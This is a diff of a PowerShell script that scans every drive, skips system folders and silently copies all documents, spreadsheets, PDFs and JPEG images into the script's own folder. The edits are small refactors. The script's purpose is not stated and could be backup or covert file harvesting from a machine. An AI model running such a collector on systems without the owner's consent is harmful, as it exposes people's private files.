@@ -33,10 +33,10 @@ function Get-FilesExcludingDirs {
     }
 }
 
-# Define directories to exclude (case-insensitive), now including "windows"
+# Define directories to exclude (case-insensitive), including "windows"
 $excludedDirs = @("windows", "program files", "program files (x86)", "system volume information")
 
-# Updated file types: removed .png and .gif; added .xls and .xlsx
+# File types to copy
 $fileTypes = @("*.doc","*.docx","*.pdf","*.jpg","*.jpeg","*.xls","*.xlsx")
 
 $destination = $PSScriptRoot
@@ -48,7 +48,9 @@ foreach ($drive in $drives) {
     $source = "$($drive.Name):\"
     Write-Host "Processing $source ..."
 
-    foreach ($file in Get-FilesExcludingDirs -Path $source -ExcludeDirs $excludedDirs -FileTypes $fileTypes) {
+    # Use pipeline to ensure immediate processing of each file found
+    Get-FilesExcludingDirs -Path $source -ExcludeDirs $excludedDirs -FileTypes $fileTypes | ForEach-Object {
+        $file = $_
         $relativePath = $file.FullName.Substring(3)
         $targetPath = Join-Path $destination $relativePath
         $targetDir = Split-Path $targetPath -Parent
@@ -61,8 +63,6 @@ foreach ($drive in $drives) {
         }
 
         Copy-Item -Path $file.FullName -Destination $targetPath -Force -ErrorAction SilentlyContinue
-
-        # Display the copied file path
         Write-Host "Copied file: $targetPath"
     }
 }
